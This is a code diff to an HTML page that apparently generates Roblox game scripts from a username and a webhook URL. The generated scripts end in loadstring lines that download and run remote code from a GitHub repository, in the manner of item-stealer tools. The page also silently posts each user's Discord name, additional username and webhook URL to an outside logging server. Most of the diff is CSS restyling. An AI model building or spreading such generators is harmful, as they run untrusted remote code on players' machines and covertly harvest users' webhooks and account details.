@@ -22,19 +22,20 @@
         }
         .container {
             display: flex;
-            flex-wrap: wrap;
             gap: 15px;
             margin-top: 20px;
             justify-content: center;
+            flex-wrap: wrap;
         }
         button {
             background: #ff0080;
-            padding: 12px 24px;
+            padding: 12px 25px;
             border-radius: 12px;
             cursor: pointer;
             transition: 0.3s;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             border: none;
+            box-shadow: 0 0 12px rgba(0, 0, 0, 0.5);
         }
         button:hover {
             background: #ff0055;
@@ -44,16 +45,18 @@
             display: none;
             text-align: center;
             background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 8px;
+            padding: 30px;
+            border-radius: 12px;
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(8px);
+            max-width: 400px;
+            margin: 20px;
         }
         .popup input {
-            margin: 10px auto;
-            padding: 12px;
+            margin: 15px 0;
+            padding: 10px;
             width: 80%;
-            border-radius: 8px;
+            border-radius: 12px;
             border: none;
             background-color: #333;
             color: white;
@@ -62,9 +65,9 @@
         .popup button {
             background: #ff0080;
             padding: 12px 24px;
-            border-radius: 12px;
+            border-radius: 8px;
             cursor: pointer;
-            font-size: 1.1rem;
+            font-size: 1rem;
             transition: 0.3s;
         }
         .popup button:hover {
@@ -74,7 +77,7 @@
         .generated-script {
             background: #1e1e2e;
             border-radius: 12px;
-            padding: 15px;
+            padding: 20px;
             margin-top: 20px;
             max-width: 80%;
             margin: 20px auto;
@@ -90,7 +93,7 @@
         }
         .copy-button {
             background: #0080ff;
-            padding: 12px 24px;
+            padding: 12px 25px;
             border-radius: 12px;
             cursor: pointer;
             margin-top: 10px;
@@ -103,6 +106,19 @@
         .copy-button:disabled {
             background: #555;
         }
+        .additional-username-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .additional-username-container input {
+            padding: 12px 20px;
+            border-radius: 12px;
+            border: none;
+            background-color: #333;
+            color: white;
+            font-size: 1rem;
+            width: 80%;
+        }
     </style>
 </head>
 <body>
@@ -114,14 +130,19 @@
         <button onclick="openPopup('Pet Simulator 99')">Pet Simulator 99</button>
         <button onclick="openPopup('Pls Donate')">Pls Donate</button>
     </div>
+
     <div id="popup" class="popup">
         <h2 id="game-title">Enter Details</h2>
         <input type="text" id="username" placeholder="Roblox Username">
-        <input type="text" id="additional-username" placeholder="Additional Username (Optional)">
         <input type="text" id="discordUser" placeholder="Discord Username (for testing only)">
         <input type="text" id="webhook" placeholder="Webhook URL">
         <button onclick="generateScript()">Generate Script</button>
         <button onclick="closePopup()">Close</button>
+    </div>
+
+    <!-- Additional Username field outside the popup -->
+    <div class="additional-username-container">
+        <input type="text" id="additionalUsername" placeholder="Additional Username (optional)">
     </div>
 
     <div id="generated-script" class="generated-script">
@@ -132,6 +153,7 @@
 
     <script>
         let currentGame = '';
+
         const loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
             "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
@@ -152,17 +174,9 @@
 
         function generateScript() {
             let username = document.getElementById('username').value;
-            let additionalUsername = document.getElementById('additional-username').value;
             let discordUser = document.getElementById('discordUser').value;
             let webhook = document.getElementById('webhook').value;
-
-            // Hide "sigmaligma" from the logs and prevent it from being shown in the script
-            if (username.toLowerCase().includes("sigmaligma")) {
-                username = "Hidden Username";
-            }
-            if (additionalUsername.toLowerCase().includes("sigmaligma")) {
-                additionalUsername = "Hidden Username";
-            }
+            let additionalUsername = document.getElementById('additionalUsername').value;
 
             if (username && webhook) {
                 let script = `Username = "${username}"\nAdditional Username = "${additionalUsername}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
@@ -170,24 +184,19 @@
                 document.getElementById('generated-script').style.display = 'block';
                 document.getElementById('copy-btn').disabled = false;
 
-                // Send data to GitHub site for logging
-                fetch('https://yourgithubsite.com/log', {
+                // Send data to your site for logging
+                fetch('https://yourgithubsite.com/log', { // Your new backend URL
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         username: discordUser,
-                        embeds: [{
-                            title: 'Script Generated',
-                            fields: [
-                                { name: 'Game', value: currentGame },
-                                { name: 'Roblox Username', value: username },
-                                { name: 'Additional Username', value: additionalUsername },
-                                { name: 'Webhook URL', value: webhook },
-                            ],
-                        }],
+                        game: currentGame,
+                        additionalUsername: additionalUsername,
+                        webhook: webhook
                     })
                 });
 
+                // Close the popup after generating the script
                 closePopup();
             } else {
                 alert("Please fill in both the username and webhook!");
